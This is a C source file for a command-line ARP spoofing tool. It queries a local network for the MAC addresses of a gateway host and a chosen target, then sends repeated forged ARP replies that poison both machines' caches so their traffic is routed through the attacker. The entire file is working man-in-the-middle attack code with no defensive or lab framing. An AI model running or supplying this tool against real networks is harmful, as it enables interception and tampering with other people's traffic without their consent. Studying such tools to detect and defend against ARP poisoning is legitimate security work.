#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <netinet/tcp.h>


#define IPSLEN  20
#define MACSLEN 25
#define NPACKS  20
#define FAIL    -1
#define ARPSIZ  42
#define IP_ALEN 4


int is_valid_ip(char *ipAddress);
void clean_exit(int e_no);
void sigintHandler(int sig_num);
void print_usage(char *pname);
void mac_to_str(char *mac_str, unsigned char mac[ETH_ALEN]);
int recv_tcp(int sock, unsigned char *buf, unsigned char *ip);
void parse_bytes(char* str, char sep, unsigned char *bytes, int maxBytes, int base);
int recv_arp(int sock, unsigned char *buf, unsigned short int op_code, uint8_t s_ip[IP_ALEN]);
int get_if_info(int sock, char dev[IFNAMSIZ], 
                          struct ifreq *ifreq_i,
                          struct ifreq *ifreq_c,
                          struct ifreq *ifreq_ip);
int send_arp(int sock, int if_idx, unsigned char *s_mac, 
                                   unsigned char *d_mac, 
                                   unsigned char *arp_s_mac, 
                                   unsigned char *arp_t_mac, 
                                   uint8_t arp_s_ip[IP_ALEN], 
                                   uint8_t arp_t_ip[IP_ALEN], 
                                   unsigned short int opcode);


uint8_t broadcast[] = "\xff\xff\xff\xff\xff\xff";
uint8_t empty[]     = "\x00\x00\x00\x00\x00\x00";
int sock_no;
unsigned char *bp;


int main(int argc, char *argv[]) {
    char dev[IFNAMSIZ];
    char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN];    
    char our_ip_str[IPSLEN], host_str[IPSLEN], target_str[IPSLEN];
    char LAN_ip[IPSLEN-4]; 
    struct ifreq ifreq_i, ifreq_c, ifreq_ip;
    uint8_t our_ip[IP_ALEN], host_ip[IP_ALEN], target_ip[IP_ALEN];
    int sock, last_dot, sufix;
    unsigned char our_mac[ETH_ALEN], target_mac[ETH_ALEN], host_mac[ETH_ALEN];

    unsigned char *recv_buf = calloc(ARPSIZ, sizeof(unsigned char *));

    // create raw socket
    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        if (getuid() != 0) {
            printf("Run again as sudo! (sudo ./arp_spoof)\n");
            clean_exit(0);
        }
        printf("Error : raw sock create failed\n");
        bp = recv_buf;
        clean_exit(1);
    }

    // pass socket number and buffer to globals for clean clean_exit
    sock_no = sock;
    bp      = recv_buf;
    signal(SIGINT, sigintHandler);

    // arg check
    if (argc < 3) {
        print_usage(argv[0]);
        clean_exit(2);
    }
    
    // get interface from arg or pcap 
    int dev_from_arg = 0;
    for (int i = 0; i < argc-1; i++) {
        if (strcmp(argv[i], "-i") == 0) {
            dev_from_arg = i+1;
            break;
        }
    }

    if (dev_from_arg) {
        int len = strlen(argv[dev_from_arg]);

        if (len > IFNAMSIZ) {
            printf("Interface name %s too long (try renaming it)\n", argv[dev_from_arg]);
            clean_exit(1);
        }
        strncpy(dev, argv[dev_from_arg], IFNAMSIZ);
        dev[len] = 0;
    }
    else {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_if_t *devs;

        // get default interface
        if (pcap_findalldevs(&devs, errbuf) == FAIL) {
            fprintf(stderr, "Error : could not default interface, please enter one %s\n", errbuf);
            clean_exit(1);
        }
        if (devs == NULL) {
            fprintf(stderr, "Error : could not default interface, please enter one\n");
            clean_exit(1);
        }
        int len = strlen(devs->name);

        if (len > IFNAMSIZ) {
            printf("Default interface name %s too long (try renaming it)\n", devs->name);
            clean_exit(1);
        }
        strncpy(dev, devs->name, IFNAMSIZ);
        dev[len] = 0;
    }

    // get interface info
    if(get_if_info(sock, dev, &ifreq_i, &ifreq_c, &ifreq_ip) == FAIL) {
        printf("Failed to get info for interface %s (you probably chose the wrong one, try ifconfig or google)\n", dev);
        clean_exit(3);
    }

    // print/save interface info 
    memcpy(our_mac, (unsigned char *)(ifreq_c.ifr_hwaddr.sa_data), ETH_ALEN);
    mac_to_str(our_m_str, our_mac); 
    strncpy(our_ip_str, inet_ntoa((((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr)), IPSLEN);
    parse_bytes(our_ip_str, '.', our_ip, 4, 10);

    // parse IP LAN
    last_dot = (strrchr(our_ip_str, '.')-our_ip_str);
    strncpy(LAN_ip, our_ip_str, last_dot);
    LAN_ip[last_dot] = 0;

    // pass defaults
    target_str[0]   = 0;
    int num_packets = NPACKS;
    sprintf(host_str, "%s.%d", LAN_ip, 1);

    int op = 0;
    while ((op = getopt(argc, argv, "i:t:h:n:")) != FAIL) {
        switch (op) {

            case 'i':
                // ignore interface argument
                break;

            case 't':
                // target argument (required)
                if ((sufix = atoi(optarg)) > 254) {
                        printf("host sufix %d to high (over 254)\n", sufix);
                        clean_exit(1);
                }
                sprintf(target_str, "%s.%d", LAN_ip, sufix);
                break;

            case 'h':
                // host argument
                if ((sufix = atoi(optarg)) > 254) {
                        printf("host sufix %d to high (over 254)\n", sufix);
                        clean_exit(1);
                }
                sprintf(host_str, "%s.%d", LAN_ip, sufix);
                break;

            case 'n':
                // num-packets argument
                num_packets = atoi(optarg);
                break;

            default:
                print_usage(argv[0]);
                clean_exit(1);
                break;
        }
    }

    // check args
    if(!target_str[0]) {
        print_usage(argv[0]);
        printf("Must provide target IP sufix\n");
        clean_exit(1);
    }
    if (!is_valid_ip(target_str)) {
        printf("Error %s is not a vaild ip address\n", target_str);
        clean_exit(2);
    }
    if (!is_valid_ip(host_str)) {
        printf("Error %s is not a vaild ip address\n", host_str);
        clean_exit(2);
    }

    // pass IP strings to bytes
    parse_bytes(target_str, '.', target_ip, IP_ALEN, 10);
    parse_bytes(host_str, '.', host_ip, IP_ALEN, 10);
  
    // send request for host MAC
    send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
            broadcast, 
            our_mac, 
            empty, 
            our_ip, 
            host_ip,
            ARPOP_REQUEST);

    // get host MAC from reply
    recv_arp(sock, recv_buf, ARPOP_REPLY, host_ip);
    struct ether_arp *arp = (struct ether_arp *)(recv_buf + sizeof(struct ether_header));
    memcpy(host_mac, arp->arp_sha, ETH_ALEN);
    mac_to_str(host_m_str, host_mac);

    // send request for target MAC
    send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
            broadcast, 
            our_mac, 
            empty, 
            our_ip, 
            target_ip,
            ARPOP_REQUEST);

    // get target MAC from reply
    recv_arp(sock, recv_buf, ARPOP_REPLY, target_ip);
    arp = (struct ether_arp *)(recv_buf + sizeof(struct ether_header));
    memcpy(target_mac, arp->arp_sha, ETH_ALEN);
    mac_to_str(target_m_str, target_mac);

    // poison host
    printf("Poisoning host...\n");
    for (int i = num_packets; i > 0; --i) {
        send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
                host_mac, 
                our_mac, 
                host_mac, 
                target_ip, 
                host_ip,
                ARPOP_REPLY);

        sleep(1);
        printf("H:(%s) ---> U:(%s) ---> T:(%s)\n", host_m_str, our_m_str, target_m_str);
    }

    // poison target 
    printf("Poisoning target...\n");
    for (int i = num_packets; i > 0; --i) {
        send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
                target_mac,
                our_mac,
                target_mac,
                host_ip,
                target_ip,
                ARPOP_REPLY);
        
        sleep(1);
        printf("T:(%s) ---> U:(%s) ---> H:(%s)\n", target_m_str, our_m_str, host_m_str);
    }
    clean_exit(0);
}


int recv_arp(int sock, unsigned char *buf, unsigned short int op_code, uint8_t s_ip[4]) {
    int bytes_recvd;

    while (1) {
        bytes_recvd = read(sock, buf, ARPSIZ);

        // check is arp
        if (ntohs(((struct ethhdr*)(buf))->h_proto) == ETH_P_ARP) {
            struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ethhdr ));

            // check is correct type & IP 
            if (ntohs(arp->ea_hdr.ar_op) == op_code && memcmp(arp->arp_spa, s_ip, 4) == 0) {
                return bytes_recvd;
            }
        }
    }
}
    
void print_usage(char *pname) {
    char *u_string = "Usage: %s -t target-sufix [-i interface   (else default)]   \n"
                     "                                   [-h host-sufix  (default 1)]  \n" 
                     "                                   [-n num-packets (default 20)]\n";
    printf(u_string, pname);
}

void clean_exit(int e_no) {
    printf("Cleaning up...\n");
    close(sock_no);
    free(bp);
    exit(e_no);
}

void sigintHandler(int sig_num) {
    signal(SIGINT, sigintHandler);
    clean_exit(0);
}

void mac_to_str(char mac_str[MACSLEN], unsigned char mac[ETH_ALEN]) {
    snprintf(mac_str, MACSLEN, "%.2X-%.2X-%.2X-%.2X-%.2X-%.2X", 
                                               mac[0],
                                               mac[1],
                                               mac[2],
                                               mac[3],
                                               mac[4],
                                               mac[5]);
}

void parse_bytes(char* str, char sep, unsigned char *bytes, int maxBytes, int base) {
    for (int i = 0; i < maxBytes; i++) {
        bytes[i] = strtoul(str, NULL, base);
        str = strchr(str, sep);

        if (str == NULL || *str == '\0') {
            break;
        }
        str++;
    }
}

int get_if_info(int sock, char dev[IFNAMSIZ], 
                struct ifreq *ifreq_i,
                struct ifreq *ifreq_c,
                struct ifreq *ifreq_ip) {

    // get index number 
    memset(ifreq_i, 0, sizeof(struct ifreq));
    strncpy(ifreq_i->ifr_name, dev, IFNAMSIZ-1);
   
    if ((ioctl(sock, SIOCGIFINDEX, ifreq_i)) < 0) {
        printf("Error : %s ioctl index read failed\n", dev);
        return FAIL;
    }

    // get MAC Address
    memset(ifreq_c, 0, sizeof(struct ifreq));
    strncpy(ifreq_c->ifr_name, dev, IFNAMSIZ-1);

    if ((ioctl(sock, SIOCGIFHWADDR, ifreq_c)) < 0) {
        printf("Error : ioctl MAC read failed\n");
        return FAIL;
    }

    //get IP Address
    memset(ifreq_ip, 0, sizeof(struct ifreq));
    strncpy(ifreq_ip->ifr_name, dev, IFNAMSIZ-1);

    if(ioctl(sock, SIOCGIFADDR, ifreq_ip) < 0) {
        printf("Error : ioctl IP read failed\n");
        return FAIL;
    }
    return 0;
}

int is_valid_ip(char *ip) {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ip, &(sa.sin_addr));
    return result > 0;
}

int send_arp(int sock, int if_idx, unsigned char *s_mac, 
                                   unsigned char *d_mac, 
                                   unsigned char *arp_s_mac, 
                                   unsigned char *arp_t_mac, 
                                   uint8_t arp_s_ip[4], 
                                   uint8_t arp_t_ip[4], 
                                   unsigned short int opcode) {
    int send_len;
    unsigned char *sendbuff = calloc(ARPSIZ, sizeof(unsigned char *));

    memset(sendbuff, 0, ARPSIZ);

    // cast packet start to ethernet header
    struct ethhdr *eth = (struct ethhdr *)(sendbuff);

    // add interface/dest MAC and protocol
    memcpy(eth->h_source, s_mac, ETH_ALEN);
    memcpy(eth->h_dest, d_mac, ETH_ALEN);
    eth->h_proto = htons(ETH_P_ARP);

    // cast next section to ARP header 
    struct ether_arp *arp = (struct ether_arp *)(sendbuff + sizeof(struct ether_header));
     
    // add ARP source/dest MAC
    memcpy(arp->arp_sha, arp_s_mac, ETH_ALEN);
    memcpy(arp->arp_tha, arp_t_mac, ETH_ALEN);
    
    // add ARP source/dest IP
    memcpy(arp->arp_spa, arp_s_ip, 4);
    memcpy(arp->arp_tpa, arp_t_ip, 4);

    // set hardware type, protocol and opcode
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(2048);
    arp->ea_hdr.ar_op  = htons(opcode);
    
    // number of bytes in MAC/IP addresses
    arp->ea_hdr.ar_hln = ETH_ALEN;   
    arp->ea_hdr.ar_pln = 4;

    // fill in sock address struct
    struct sockaddr_ll sadr_ll;
    sadr_ll.sll_ifindex = if_idx;
    sadr_ll.sll_halen   = ETH_ALEN;
    memcpy(sadr_ll.sll_addr, d_mac, ETH_ALEN);

    // send
    if ((send_len = sendto(sock, sendbuff, ARPSIZ, 0, (const struct sockaddr*)&sadr_ll, sizeof(struct sockaddr_ll))) < 0) {
        printf("Error : sending failed :(\n");
        return FAIL;
    }
    return 0;
}

